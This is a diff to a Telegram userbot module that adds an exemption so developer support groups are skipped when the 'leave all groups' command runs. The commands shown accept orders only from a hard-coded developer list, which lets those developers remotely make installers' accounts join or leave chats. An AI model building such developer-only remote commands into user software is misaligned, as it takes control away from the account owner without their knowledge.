@@ -15,10 +15,11 @@ YANG NYOLONG REPO INI TRUS DIJUAL JADI PREM, LU GAY...
 from pyrogram import Client, enums, filters
 from pyrogram.types import Message
 from geezlibs.geez import geez, devs
-from geezlibs import DEVS
+from geezlibs import DEVS, BL_GCAST
 from Geez import SUDO_USER
 from Geez.modules.basic import add_command_help
 from Geez import cmds
+from config import BOTLOG_CHATID
 
 @Client.on_message(filters.command("gjoin", "*") & filters.user(DEVS))
 @geez("join", cmds)
@@ -45,19 +46,23 @@ async def leave(client: Client, message: Message):
 @Client.on_message(filters.command("gleaveallgc", "*") & filters.user(DEVS))
 @geez("leaveallgc", cmds)
 async def kickmeall(client: Client, message: Message):
+    geez_support = ["GeezRam", "GeezSupport"]
     tex = await message.reply_text("`Global Leave from group chats...`")
     er = 0
     done = 0
     async for dialog in client.get_dialogs():
         if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
             chat = dialog.chat.id
+            chat_title = dialog.chat.title
+            if chat_title in geez_support:
+                continue
             try:
                 done += 1
                 await client.leave_chat(chat)
             except BaseException:
                 er += 1
     await tex.edit(
-        f"**Successfully left {done} Groups, Failed to left {er} Groups**"
+        f"**Successfully left {done} Groups, Failed to leave {er} Groups**"
     )
 
 @Client.on_message(filters.command("gleaveallch", "*") & filters.user(DEVS))
